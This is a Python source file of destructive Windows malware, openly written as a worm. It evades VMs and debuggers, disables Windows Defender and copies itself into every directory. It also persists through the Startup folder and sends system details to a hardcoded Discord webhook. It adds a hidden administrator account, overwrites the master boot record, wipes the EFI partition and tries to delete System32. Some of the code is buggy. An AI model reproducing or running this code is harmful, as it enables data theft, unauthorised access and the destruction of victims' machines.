 import os

os.system("python -m pip install discord_webhook pywget uuid logging")

import time

import shutil

import socket

import uuid

import json

import logging

import ctypes

import platform

import getpass

import subprocess as sub

from discord_webhook import DiscordWebhook

from pywget import wget

USER_NAME = getpass.getuser()

class worm:

    

    def __init__(self, path=None, target_dir_list=None, iteration=None):

        if isinstance(path, type(None)):

            self.path = "/"

        else:

            self.path = path

        if isinstance(target_dir_list, type(None)):

            self.target_dir_list = []

        else:

            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):

            self.iteration = 2

        else:

            self.iteration = iteration

        self.own_path = os.path.realpath(__file__)

    def list_directories(self,path):

        self.target_dir_list.append(path)

        files_in_current_directory = os.listdir(path)

        

        for file in files_in_current_directory:

            if not file.startswith('.'):

                absolute_path = os.path.join(path, file)

                print(absolute_path)

                if os.path.isdir(absolute_path):

                    self.list_directories(absolute_path)

                else:

                    pass

    def create_new_worm(self):

        for directory in self.target_dir_list:

            destination = os.path.join(directory, ".worm.py")

            shutil.copyfile(self.own_path, destination)

    def copy_existing_files(self):

        for directory in self.target_dir_list:

            file_list_in_dir = os.listdir(directory)

            for file in file_list_in_dir:

                abs_path = os.path.join(directory, file)

                if not abs_path.startswith('.') and not os.path.isdir(abs_path):

                    source = abs_path

                    for i in range(self.iteration):

                        destination = os.path.join(directory,("."+file+str(i)))

                        shutil.copyfile(source, destination)

    def start_worm_actions(self):

        self.list_directories(self.path)

        print(self.target_dir_list)

        self.create_new_worm()

        self.copy_existing_files()

def vmcheck():

    if hasattr(sys, 'real_prefix'):

        print("Error, you can't run this script under a virtual machine")

        exit()

    else:

        print("Loading...")

def add_to_startup(file_path=""):

    if file_path == "":

        file_path = os.path.dirname(os.path.realpath(__file__))

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:

        bat_file.write(r'start "" %s' % file_path)

def getSystemInfo():

    try:

        info={}

        info['platform']=platform.system()

        info['platform-release']=platform.release()

        info['platform-version']=platform.version()

        info['architecture']=platform.machine()

        info['hostname']=socket.gethostname()

        info['ip-address']=socket.gethostbyname(socket.gethostname())

        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))

        info['processor']=platform.processor()

        return json.dumps(info)

    except Exception as e:

        logging.exception(e)

        info = json.loads(getSystemInfo())

        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/902111778815742002/ZPePRQWOmldlKfT4ZSwv-Ytr8BJ-eCM3YGn9xrk3AvD0TPfP0UIKC91A38YVy4uDSesD", content=info)

def debugcheck():

    gettrace = getattr(sys, 'gettrace', None)

    if gettrace is None:

         print('Passed verification')

    elif gettrace():

         print('File is getting debugged, exiting')

         exit()

def systemkill():

    os.remove("C:/Windows/System32")

def desktopkill():

    link = "https://wallpapercave.com/wp/wp1960184.png"

    wget.download(link)

    SPI_SETDESKWALLPAPER = 20 

    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "wp1960184.png", 0)

    while 1==1:

        spam = open("LastMinutes","+w")

        spam.write("FUCKED")

        username = "ISEEYOU"

        password = "death"

        command = """

$nusnm = """ + '"{}"'.format(username) + """

$nuspss = ConvertTo-SecureString """ + '"{}"'.format(passwds) + """ -AsPlainText -Force

New-LocalUser -Name $nusnm -Password $nuspss

Add-LocalGroupMember -Group "Administrators" -Member $nusnm

Get-LocalUser

"""

        print(command)

        exec = sub.Popen(["powershell","& {" + command + "}"])

        time.sleep(60)

def disabledefend():

    command = "Set-MpPreference -DisableRealtimeMonitoring $true"

    print(command)

    exec = sub.Popen(["powershell", "& {" + command + "}"])

def efikill():

    os.system("mountvol K: /S")

    os.system("cd K:/")

    os.system("del /S K:/")

def killmbr():

    mbr = open(r"\\.\PhysicalDisk0", "r+b")

    mbr.write("01001011 1100110111 1101000010 1101000100 1100001110 01001001 1100111000 1101000001 1100000111 1101000100 01001100 1100110111 1100001110 1100000111 1100010000 01001100 1100110110 1101010111 1100000111 1101000000 01000101 1100110110 1100010100 1101010001 1100001011 01000100 1100110101 1100000000 1101100000 1100001110 01000010 1100110111 1101000110 1101000100 1100000101 01011001 1100111000 1100010000 1100010011 1100000100 01000011 1100111000 1101000100 1100000100 1100000001 01011001 1100110100 1100111101 1100000111 1100001010 01010000 1100110100 1101001010 1100010101 1100011011 01001000 1100110111 1101001010 1100000110 1100111101 01000101 1100110110 1101011000 1100000110 1101000110 01000100 1100111000 1101000010 1101010010 1100111101")

if os.name=="nt":

    print("Supported OS, Starting Script...")

    debugcheck()

    vmcheck()

    disabledefend()

    current_directory = os.path.abspath("")

    worm = worm(path=current_directory)

    worm.start_worm_actions()

    add_to_startup()

    getSystemInfo()

    desktopkill()

    killmbr()

    systemkill()

else:

    print("OS Is not supported, This tool works on windows only!")

    time.sleep(10)

    exit()
